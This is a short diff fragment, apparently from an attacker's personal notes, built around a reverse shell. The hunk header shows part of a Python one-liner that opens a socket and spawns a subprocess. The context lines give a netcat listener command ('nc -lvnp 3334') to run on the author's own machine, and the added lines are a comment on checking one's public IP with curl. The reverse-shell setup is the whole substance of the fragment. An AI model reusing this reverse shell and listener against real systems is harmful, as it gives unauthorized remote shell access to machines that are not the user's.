@@ -6,3 +6,6 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 # on my machine run:
 # nc -lvnp 3334
+
+# check current ip
+# curl ifconfig.me
